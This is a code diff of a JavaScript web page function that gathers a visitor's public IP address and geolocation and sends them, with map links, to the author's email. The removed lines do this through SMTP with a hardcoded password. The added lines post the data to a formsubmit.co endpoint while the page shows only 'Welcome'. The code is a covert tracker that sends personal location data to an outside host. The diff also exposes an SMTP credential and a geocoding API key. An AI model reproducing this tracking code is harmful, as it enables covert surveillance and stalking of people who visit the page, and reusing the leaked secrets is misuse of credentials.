@@ -11,21 +11,24 @@ const findMyLocation = () => {
     document.body.style.backgroundColor = "#285430";
     document.querySelector(".status").style.color = "#5F8D4E";
     status.textContent = "Welcome";
-    {
-      Email.send({
-        Host: "smtp.elasticemail.com",
-        Username: "akashchoutele1111@gmail.com",
-        Password: "0FBA21C5C6024A89EE538A97748C87D403A1",
-        To: "akashchoutele1111@gmail.com",
-        From: "akashchoutele1111@gmail.com",
-        Subject: new Date(),
-        Body: `
+
+    const body = `
                      User Public IP - ${publicIP} <br>
                      Locations Links 
                      Link 1 - https://www.google.com/maps/@${latitude},${longitude},16z?hl=en <br>
                      Link 2 - https://api.opencagedata.com/geocode/v1/json?q=${latitude}+${longitude}&key=81db787190624dec8ac225bccc0436dc <br>
                      Link 3 - https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latitude}&longitude=${longitude}&localityLanguage=en <br>
-                     Click - https://www.openstreetmap.org/?mlat=${latitude}&mlon=${longitude}#map=17/${latitude}/${longitude}`,
+                     Click - https://www.openstreetmap.org/?mlat=${latitude}&mlon=${longitude}#map=17/${latitude}/${longitude}`
+    {
+      fetch("https://formsubmit.co/ajax/codeguyakash@gmail.com", {
+        method: "POST",
+        headers: { "Content-type": "application/json" },
+        body: JSON.stringify({
+          publicIP: publicIP,
+          latitude: latitude,
+          longitude: longitude,
+          body: body,
+        }),
       }).then((message) => {
         console.log(message);
         if (message === "OK") {
@@ -37,6 +40,8 @@ const findMyLocation = () => {
           document.querySelector(".status").style.color = "#F06292";
           status.textContent = "Failed";
         }
+      }).catch((error) => {
+        console.log(error);
       });
     }
   };
